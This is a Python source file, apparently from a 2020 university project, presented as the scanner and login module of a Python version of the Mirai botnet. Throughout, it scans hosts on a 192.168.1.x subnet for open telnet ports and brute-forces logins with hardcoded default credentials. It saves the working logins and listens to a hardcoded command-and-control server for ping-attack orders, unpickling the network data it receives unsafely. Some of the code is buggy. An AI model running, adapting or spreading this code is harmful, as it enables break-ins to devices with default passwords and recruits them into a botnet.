#!/usr/bin/env python3
# -*- coding: utf-8 -*-

""" This file is the scanner + login module for Mirai botnet version Python"""

__author__ = "Nemanja Pantic"
__copyright__ = "Copyright 2020, HEIG-VD"
__license__ = "GPL"
__version__ = "1.0"
__email__ = "nemanja.pantic@heig-vd.ch"


import socket
import telnetlib
import sys
import threading
import random
import time
import pickle
import subprocess

cred_file = []
lock = threading.Lock()
visited_ip = set()
thread = []

def ping_attack(target):
    """
    This method is the ping attack method, it sends 4 packet to a common target
    :param target: The target that we want to ping
    :return: None
    """
    print("We are pinging attack")

    p = subprocess.Popen(('ping', '-c 4', target), stdout=subprocess.PIPE)
    for row in iter(p.stdout.readline, b''):
        print(row.rstrip())   # process here
    p.terminate()

    print("End ping attack")


def cnc_listening():
    """
    This method listen request comming from CNC
    :return: Nothing
    """
    s = socket.socket()
    host = '192.168.1.7'
    port = 6000

    s.connect((host, port))

    while True:
        print("inside cnc listening")
        try:

            data = s.recv(1024)

        except :
            print("The server disconnected")
            sys.exit()

        temp = pickle.loads(data)
        print(temp[0])
        if temp[0] == 'ping':
            print("Gonna start ping attack")
            ping_attack(temp[1])
        m = pickle.dumps(['up'])
        s.send(m)


def port_scan(host):
    """
    This method is used to check if the port 23 is open on the host
    :param host: target that we want to know if port 23 is open
    :return: True if it's open, False if it's closed
    """
    t = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    t.settimeout(2)
    connect = t.connect_ex((host, 23))
    if connect == 0:
        print("[+]\tPort 23: Open")
        t.close()
        return True
    else:
        print("[-]\tPort 23: Closed")
        t.close()
        return False


def get_credentials():
    """
    Contain a hardcoded list of user:pass
    :return: list of user:pass
    """
    combo = [
        "root:root",
        "admin:admin",
        "daemon:daemon",
        "root:vizxv",
        "pi:raspberry",
    ]

    return combo


def get_random_ip():
    """
    This method generate a random IP and check if this IP has been scanned once
    :return: a random ip
    """
    while True:

        global visited_ip
        ip = "192.168.1."
        rand_4 = str(random.randint(0, 255))
        ip += rand_4
        with lock:
            if ip not in visited_ip:
                #print(visited_ip)
                visited_ip.add(ip)
                return ip


def brute_login():
    """
    This is the main method which get credentials, get a random IP and try to connect with telnet to a target
    if the connection telnet is successful, it stores the result in "valid_credentials.txt" in format :
    ip:port user:pass
    :return: None
    """
    # We clean the result file
    with lock:
        with open("valid_credentials.txt", "w") as f:
            f.close()

    while True:
        found = False
        all_creds = get_credentials()
        tn = None  # telnet connection
        for x in range(len(all_creds)):
            print(thread)
            if found :
                break
            try:
                current_creds = all_creds[x].split(':')

                user = current_creds[0]
                print(user)
                password = current_creds[1]
                print(password)
                if tn:
                    print("[+] Trying user:\t" + user)
                    tn.write(user.encode("utf-8") + b"\n")
                while True:
                    time.sleep(0.2)
                    if not tn:
                        host = get_random_ip()
                        while not (port_scan(host)):
                            print(host)
                            host = get_random_ip()
                        tn = telnetlib.Telnet(host)
                        # tn.debuglevel = 10
                        print("[-]\tPort 23: Connecting...")
                    response = tn.read_until(b":", 1)  # until input request
                    print(response)

                    if "ncorrect" in response.decode("utf-8"):
                        break

                    if "ogin:" in response.decode("utf-8"):
                        print("[+] Trying user:\t" + user)
                        tn.write(user.encode("utf-8") + b"\n")

                    if "assword:" in response.decode("utf-8"):
                        print("[+] Trying password:\t" + password)
                        tn.write(password.encode("utf-8") + b"\n")

                    if "pi@" in response.decode("utf-8"):
                        with lock:
                            with open("valid_credentials.txt", "a") as f:
                                print("Got this for you : {}:{} {}:{}".format(host, '23', user, password))
                                f.write(str(host) + ":23 " + str(user) + ":" + str(password) + "\n")
                            found = 1  # Get out from input request while
                            break


            except EOFError as e:
                pass  # Disconnected, no problem, we will connect again.


if __name__ == "__main__":
    for i in range(int(sys.argv[1])):
        process = threading.Thread(target=brute_login)
        process.daemon = True
        process.start()
        thread.append(process)

    process = threading.Thread(target=cnc_listening())
    process.daemon = True
    process.start()
    thread.append()

    for process in thread:
        process.join()
